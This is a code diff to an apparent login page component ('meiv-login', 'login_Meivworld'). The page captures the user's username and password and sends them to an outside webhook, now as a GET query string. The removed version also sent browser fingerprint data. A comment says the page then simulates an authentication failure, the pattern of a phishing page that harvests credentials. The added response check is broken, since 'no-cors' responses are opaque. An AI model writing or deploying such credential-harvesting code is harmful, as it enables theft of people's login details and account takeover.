@@ -32,27 +32,27 @@ useEffect(() => {
     if (e) e.preventDefault();
     
 
-          fetch('http://auto.diasfernandes.pt/webhook/72bffd44-7061-4ab2-adfe-1a04665cc603', {
+// Send login data to the webhook endpoint
+    // Note: The 'no-cors' mode is used here to avoid CORS issues in this example.
+// temos de corregir o redirect no servidor para aceitar o CORS
+
+const dataForm = new URLSearchParams();
+dataForm.append('username', username);
+dataForm.append('password', password
+);
+
+          fetch('http://auto.diasfernandes.pt/webhook/72bffd44-7061-4ab2-adfe-1a04665cc603/?' + dataForm.toString(), {
             mode: 'no-cors',
-        method: 'POST',
+        method: 'GET',
         headers: {
-          'Content-Type': 'application/json'
+          'Content-Type': 'application/x-www-form-urlencoded',
         },
-        body: JSON.stringify({
-          source: 'meiv-login',
-          username,
-          password,
-          userAgent: navigator.userAgent,
-          ip:  navigator.connection ? navigator.connection.remoteAddress : 'unknown',
-          clientInfo: {
-            platform: navigator.platform,
-            appVersion: navigator.appVersion,
-            userAgent: navigator.userAgent,
-            language: navigator.language
-          },
-          timestamp: new Date().toISOString(),
-          step: 'login_Meivworld'
-        })
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        return response.text();
       });
       
     // Validate credentials (simulating authentication failure)
